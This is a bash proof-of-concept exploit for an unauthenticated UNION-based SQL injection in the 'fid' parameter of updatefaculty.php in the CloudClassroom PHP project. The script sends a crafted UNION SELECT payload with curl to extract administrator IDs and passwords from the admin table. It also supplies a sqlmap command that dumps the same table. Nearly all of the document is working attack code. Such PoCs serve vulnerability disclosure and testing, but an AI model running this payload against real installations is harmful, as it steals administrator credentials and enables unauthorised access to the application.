#!/usr/bin/env bash
# PoC — UNION SQLi in updatefaculty.php?fid (CloudClassroom-PHP-Project)
set -u
T="${1:-http://127.0.0.1:9292}"
echo "[*] Target: $T  (unauthenticated, faculty table = 9 columns)"
echo "[*] Dumping admin credentials:"
curl -s -G "$T/updatefaculty.php" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin-- -" \
  | grep -oE 'value="\[[^]]*\]"' | sed 's/^/    /'
echo "[*] sqlmap: sqlmap -u \"$T/updatefaculty.php?fid=101\" -p fid --batch --dump -T admin"
